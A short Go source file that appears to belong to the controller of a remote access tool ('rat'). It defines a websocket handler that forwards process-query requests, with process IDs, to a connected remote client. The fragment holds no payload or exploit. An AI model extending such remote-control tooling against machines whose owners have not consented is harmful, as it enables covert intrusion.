package main

import (
	"rat/common"

	"encoding/json"

	"golang.org/x/net/websocket"
)

type ProcessQueryMessage struct {
	Type int   `json:"type"`
	PIDs []int `json:"pids,omitempty"`
}

type ProcessMessage struct {
	PID  int    `json:"pid"`
	Path string `json:"path"`
}

func (d ProcessQueryMessage) Handle(ws *websocket.Conn, client *Client, data string) error {
	var j ProcessQueryMessage
	json.Unmarshal([]byte(data), &j)

	client.Listeners[common.ProcessHeader] = ws
	client.Queue <- ProcessPacket{j.Type, j.PIDs}
	return nil
}
